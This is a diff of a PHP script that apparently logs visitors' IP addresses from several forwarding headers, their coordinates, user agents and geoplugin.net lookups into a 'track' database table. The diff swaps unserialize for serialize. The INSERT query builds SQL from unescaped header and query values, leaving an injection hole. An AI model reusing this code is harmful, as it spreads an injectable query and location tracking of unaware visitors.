@@ -52,32 +52,32 @@ if ($lon == NULL){header("Refresh:5");}else{
 $google = "https://maps.google.com/maps?q=loc:".$lat."+".$lon;}
 if ($client != NULL){
 $clientv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_CLIENT_IP']);
-$clientgeo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$client));
-$clientv6geo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$clientv6));}
+$clientgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$client));
+$clientv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$clientv6));}
 if ($xforf != NULL){
 $xforfv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_X_FORWARDED_FOR']);
-$xforfgeo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforf));
-$xforfv6geo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforfv6));}
+$xforfgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforf));
+$xforfv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforfv6));}
 if ($xfor != NULL){
 $xforv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_X_FORWARDED']);
-$xforgeo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xfor));
-$xforv6geo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforv6));}
+$xforgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xfor));
+$xforv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforv6));}
 if ($forf != NULL){
 $forfv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_FORWARDED_FOR']);
-$forfgeo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forf));
-$forfv6geo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forfv6));}
+$forfgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forf));
+$forfv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forfv6));}
 if ($for != NULL){
 $forv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_FORWARDED']);
-$forgeo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$for));
-$forv6geo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forv6));}
+$forgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$for));
+$forv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forv6));}
 if ($ip != NULL){
 $ipv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['REMOTE_ADDR']);
-$ipgeo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ip));
-$ipv6geo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipv6));}
+$ipgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ip));
+$ipv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipv6));}
 if ($ipa != NULL){
 $ipav6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_GET['addr']);
-$ipageo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipa));
-$ipav6geo = unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipav6));}
+$ipageo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipa));
+$ipav6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipav6));}
 include 'huMf6GwI0pbSg1k.php';
 $conn = OpenCon();
 $sql = "INSERT INTO track(client,xforf,xfor,forf,for,ip,ipa,lat,lon,google,clientv6,xforfv6,xforv6,forfv6,forv6,ipv6,ipav6,agent,hagent,gagent,clientgeo,xforfgeo,xforgeo,forfgeo,forgeo,ipgeo,ipageo,clientv6geo,xforfv6geo,xforv6geo,forfv6geo,forv6geo,ipv6geo,ipav6geo) VALUES ('$client','$xforf','$xfor','$forf','$for','$ip','$ipa','$lat','$lon','$google','$clientv6','$xforfv6','$xforv6','$forfv6','$forv6','$ipv6','$ipav6','$agent','$hagent','$gagent','$clientgeo','$xforfgeo','$xforgeo','$forfgeo','$forgeo','$ipgeo','$ipageo','$clientv6geo','$xforfv6geo','$xforv6geo','$forfv6geo','$forv6geo','$ipv6geo','$ipav6geo')";
